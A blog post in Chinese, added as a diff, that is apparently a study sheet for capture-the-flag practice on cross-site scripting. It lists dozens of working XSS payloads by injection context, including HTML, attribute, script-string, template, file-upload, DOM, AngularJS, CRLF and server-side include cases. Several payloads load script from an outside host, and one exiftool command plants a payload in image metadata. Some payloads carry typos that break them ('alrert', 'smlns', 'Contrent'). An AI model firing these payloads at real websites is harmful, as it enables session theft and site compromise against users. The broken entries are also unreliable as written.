@@ -1,0 +1,158 @@
+---
+layout: post
+title: XSS Challenge
+date: 2020-04-25 00:02:00 +0300
+description: CSCG CTF Ropnop
+img: cross-site-scripting-xss.jpg # Add image post (optional)
+tags: [归档] # add tag
+---
+***
+### <font color=0066FF>序言</font>
+
+<font color=green>关于跨站点脚本(XSS)，这是互联网中发现的最广泛和最常见的缺陷。你必须熟悉这个缺陷的基本概念才能继续下去！</font>
+
+### <font color=0066FF>elementary level</font>
+**HTML上下文 - 简单的标记注入:**
+> <svg onload=alrert(1)><br>
+  "><svg onload=alert(1)>
+
+**块标记注入**
+&emsp;&emsp;当输入落在以下标签内部或打开/关闭之间的时候
+> </tag><svg onload=alert(1)><br>
+  "></tag><svg onload=alert(1)>
+
+**内联注入**
+&emsp;&emsp;当用户输入落在HTML标记的属性值内的时候使用，但该标记不能以大于号(>)结尾。
+> "onmouseover=alert(1) //<br>
+  "autofocus onfocus=alert(1) //
+
+**源代码注入**
+&emsp;&emsp;当输入作为以下HTML标记属性的值时使用:href, src, data或action。脚本标记中的src属性可以是URL或者“data:alert(1)”.
+> javascript:alert(1)
+
+**Javascript上下文 - 代码注入**
+&emsp;&emsp;当输入落在脚本块中时，在字符串分隔值内使用。
+> '-alert(1)-'<br>
+  '-alert(1)//
+
+**使用Escape Bypass进行代码注入**
+&emsp;&emsp;当输入落在脚本块中时，在字符串分隔值内使用，但引号由反斜杠转义。
+> \'-alert(1)//
+
+**标记注入**
+当输入落在脚本块中的任何位置时使用
+> </script><svg onload=alert(1)>
+
+<br>
+
+### <font color=0066FF>advanced level</font>
+---
+**逻辑块中的代码注入**
+&emsp;&emsp;当输入落在脚本块中时，使用第一个或第二个有效负载，在字符串分隔符值内，并在单个逻辑块内，如函数或条件（if, else, etc）。如果使用反斜杠转义quote,请使用第三个有效负载。
+> '}alert(1);{}'<br>
+  '}alert(1)%0A{'<br>
+  \'}alert(1);{//
+
+**无引用代码注入**
+&emsp;&emsp;在同一行JS代码中存在多重反射时使用。第一个有效负载在简单的JS变量中工作，第二个在非嵌套的JS对象中工作。
+> -alert(1)//\<br>
+  -alert(1)}//\
+
+**模板文字中的占位符注入**
+&emsp;&emsp;当输入在反引号``分隔的字符串或模板引擎中时使用.
+> ${alert(1)}
+
+**HTML上下文中的多重反射 - 双反射（单输入）**
+&emsp;&emsp;用于利用同一页面上的多个反射
+> 'onload=alert(1)><svg/1='<br>
+  '>alert(1)</script><script/1='<br>
+  \*/alert(1)</script><script>/\*
+
+**三重反射（单输入）**
+&emsp;&emsp;用于利用同一页面上的多个反射
+> \*/alert(1)">'onload="/\*<svg/1>'<br>
+  \`-alert(1)">'onload="\`<svg/1='<br>
+  \*/</script>'>alert(1)/\*<script/1='
+
+**HTML上下文中的多输入反射（双重和三重）**
+&emsp;&emsp;用于在同一页面上利用多个输入反射。在HPP(HTTP参数污染)场景中也很有用，其中存在重复参数的反射。第三个有效负载使用相同参数的逗号分隔反射。
+> p=<svg/1='&q='onload=alert(1)><br>
+  p=<svg 1='&q='onload='/\*&r=\*/alert(1)'><br>
+  q=<script/&q=/src=data:&q=alert(1)>
+
+**文件上传注入 - 文件名**
+&emsp;&emsp;当上传的文件反映在目标页面的某处时使用。
+> "><svg onload=alert(1)>.gif"
+
+**文件上传注入 - 元数据Metadata**
+&emsp;&emsp;在文件上传的元数据反映在目标页面的某处时使用。使用命令行exiftool,可以设置任何元数据字段。
+> $exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
+
+**文件上传注入 - SVG文件**
+&emsp;&emsp;用于在上载图像文件时在目标上创建存储的XSS。将以下内容保存为"xss.svg"。
+> <svg xmlns="http://www.w3.org/2000/svg” onload="alert(1)“/>
+
+**DOM插入注入**
+&emsp;&emsp;当注入作为有效标记插入DOM而不是反映在源代码中时，用于测试XSS.它适用于脚本标记和其他向量不起作用的情况。
+> <img src=1 onerror=alert(1)><br>
+> <iframe src=javascript:alert(1)><br>
+> <details open ontoggle=alert(1)>
+
+**DOM插入注入 - 资源请求Resource Request**
+&emsp;&emsp;当页面的javascript代码将请求的结果插入页面时，使用对攻击者控制的URL(注入)。
+> data:text/html,<img src=1 onerror=alert(1)><br>
+  data:text/html,<iframe src=javascript:alert(1)>
+
+**PHP_SELF注入**
+&emsp;&emsp;例如，当目标的底层PHP代码将当前URL用作HTML表单的属性值时使用。使用前导斜杠(/)在PHP扩展和查询部分(?)的开始之间进行注入。
+> https://brutelogic.com.br/xss.php/"><svg onload=alert(1)>?a=reader
+  
+**脚本注入 - 没有关闭标记**
+&emsp;&emsp;在反射代码中某处有一个关闭脚本标记(</script>)时使用。
+> <script src=data:,alert(1)'><br>
+  <script src=//brutelogic.com.br/1.js>
+
+**Javascript postMessage() DOM注入(使用iframe)**
+&emsp;&emsp;在没有检查原点的javascript代码中的"window.addEventListener('message',...)"中有"message"事件监听器时使用。目标必须能够成帧(根据上下文的X帧选项标题)。保存为HTML文件(或使用数据:text/html),提供TARGET_URL和INJECTION(XSS向量或有效负载)。
+> <iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION",\*')">
+
+**基于XML的XSS**
+&emsp;&emsp;用于在XML页面中注入XSS向量(内容类型为text/xml或application/xml)。如果输入登录评论部分或"]]>"如果输入登陆"CDATA"部分，则在"-->"前面加载有效负载
+> \<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script><br>
+  \<x:script smlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+
+**AngularJS注入(v1.6及以上)**
+&emsp;&emsp;在页面中加载AngularJS库时使用，在带有ng-app指令(第一个有效负载)的HTML块内或创建自己的(第二个有效负载)。
+> \{\{$new.constructor('alert(1)')()}}
+  \<x ng-app>\{\{$new.constructor('alert(1)')()}}
+
+**CRLF注入**
+&emsp;&emsp;当应用程序反映其中一个响应标头中的输入时，允许注入回车符(%0D)和换行符(%0A)字符。如下分别为Gecko和webkit的向量
+> %0D%0ALocation://x:1%0D%0AContrent-Type:text/html%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E<br>
+  %0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
+
+**通用XSS向量**
+&emsp;&emsp;使用onscroll时间处理程序时，无需用户交互即可使用XSS。它适用于address,blockquote,body,center,dir,div,dl,dt,form,li,menu,ol,p,pre,ul和h1到h6 HTML标签。
+> <p style=overflow:auto; font-size:999px onscroll=alert(1)>AAA<x/id=y></p> #y
+
+**XSS in SSL**
+&emsp;&emsp;在存在服务器端包含(SSI)注入时使用。
+> <<!--%23set var="x" value="svg onload=alert(1)"--><!--%23echo var="x"-->>
+
+**SQLi基于错误的XSS**
+&emsp;&emsp;在可以触发SQL错误消息的端点中使用(使用引号或反斜杠)。
+> '1<svg onload=alert(1)><br>
+  <svg onload=alert(1)>\
+
+**引导XSS向量(Bootstrap XSS Vector)**
+&emsp;&emsp;当页面上有引导库时使用。它还绕过Webkit Auditor,只需单击页面中的任意位置即可触发。任何href值的char都可以通过HTML编码做旁路过滤器。
+> <html data-toggle=tab href="<img src=x onerror=alert(1)>"><br>
+  浏览器通知(Browser Notification)用作报警，提示和确认弹出窗口的替代方法。需要用户接受(第一个有效载荷)但是一旦用户先前已经为该站点授权，则可以使用第二个。<br>
+  Notification.requestPermission(x=>{new(Notification)(1)})<br>
+  new(Notification)(1)
+
+<br>
+### <font color=0066FF>XSS练习</font>
+[XSS Challenges](https://xss-quiz.int21h.jp/)<br>
+[XSS Game](https://xss-game.appspot.com/)<br>
+[XSS Challenges(2)](https://xss.pwnfunction.com/)
